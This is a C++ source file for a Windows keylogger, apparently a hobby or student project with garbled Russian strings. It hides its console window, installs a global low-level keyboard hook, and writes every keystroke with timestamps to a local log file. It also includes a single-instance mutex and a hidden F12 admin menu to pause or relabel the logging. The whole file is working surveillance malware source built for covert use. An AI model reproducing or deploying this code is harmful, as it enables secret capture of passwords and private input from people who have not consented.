#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <iostream>
#include <sstream>
#include <chrono>
#include <iomanip>

using namespace std;

const string fileName = "logfile.txt";

string name;
string lastTime;
string path;
bool isPressed;
bool state = true;
bool admin = false;

#pragma region FUNCTION_SIGNATURES
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
void Hide();
string GetTime();
void Log(string text);
void UnHide();
#pragma endregion

void main(string userName,string userPath) 
{
	setlocale(LC_ALL, "Russian");
	Hide();
	
	name = userName;
	path = userPath;

	/*�������� ������ ����� ���������*/
	HANDLE mute;
	mute = CreateMutex(NULL, FALSE, "KeyLogger");
	DWORD result = WaitForSingleObject(mute, 0);
	if (result != WAIT_OBJECT_0) 
	{
		exit(0);
	}

	/*�������� ���� �� ������� ������*/
	lastTime = " ";
	Log("\n\n" + GetTime() +"["+name +" ����� � �������]\n");
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0);
	MSG msg;
	while (!GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);		
	}
	UnhookWindowsHookEx(hook);
}

#pragma region HIDDEN_FUNCTION
string GetTime()
{
	auto now = std::chrono::system_clock::now();
	auto in_time_t = std::chrono::system_clock::to_time_t(now);

	std::stringstream ss;
	ss << std::put_time(std::localtime(&in_time_t), "[%Y-%m-%d] %H:%M:%S");

	return ss.str();
}

void Log(string text) 
{
	ofstream logfile;
	logfile.open(path+fileName, fstream::app);
	logfile << text;
	logfile.close();
}

void Log(char key)
{
	ofstream logfile;
	logfile.open(path + fileName, fstream::app);
	if (lastTime != GetTime()) 
	{
		logfile <<"\n"<< GetTime() << " " << key;
		lastTime = GetTime();
	}
	else 
	{
		logfile << key;
	}
	logfile.close();
}

void OpenAdminMenu() 
{
	UnHide();
	cout << "1)�����\n2)���������� ������\n3)��������� ������\n4)��������� ������\n5)�������� ����������� ������������\n0)����� �� ������ ��������������";
	int menu  = 1;
	while (menu != 0)
	{
		cin >> menu;
		switch (menu)
		{
		case 1:
			exit(0);
			break;
		case 2:
			state = false;
			break;
		case 3:
			state = true;
			break;
		case 4:
			if (state) {
				cout << "��������� - ON";
			}
			else {
				cout << "��������� - OFF";
			}
			break;
		case 5:
			cout << "������� ����� ��� ������������";
			cin >> name;
			Log("��� �������� ��" + name);
			break;
		}
	}
	Hide();
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	static unsigned char keystate[256];


		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		int code = p->vkCode;
		if (state) {
		switch (wParam)
		{
		case (WM_KEYDOWN):
			switch (code)
			{
			case 20:
				if (!GetKeyState(VK_CAPITAL))
				{
					Log("\n" + GetTime() + " [Caps Lock] - ON");
				}
				else {
					Log("\n" + GetTime() + " [Caps Lock] - OFF");
				}
				break;
			case 160:
				if (!isPressed)Log("\n" + GetTime() + " [Shift] - Pressed"); isPressed = true;
				break;
			case 162:
				Log("\n" + GetTime() + " [Ctrl]");
				break;
			case 13:
				Log("\n" + GetTime() + " [Enter]");
				break;
			case 8:
				Log("\n" + GetTime() + " [BackSpace]");
				break;
			case 9:
				Log("\n" + GetTime() + " [TAB]");
				break;
			case 188:
				Log("\n" + GetTime() + ",");
				break;
			case 190:
				Log("\n" + GetTime() + ".");
				break;
			case 123:
				Log("\n" + GetTime() + "[������� ����� ��������������]");
				admin = true;
				OpenAdminMenu();
				break;
			default:
				Log((char)code);
				break;
			}
			break;
		case WM_KEYUP:
			//cout << code;
			switch (code)
			{
			case 160:
				isPressed = false;
				Log("\n" + GetTime() + " [Shift] - UnPressed");
			}
			break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Hide() {
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}
void UnHide() {
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_SHOW);
}
#pragma endregion
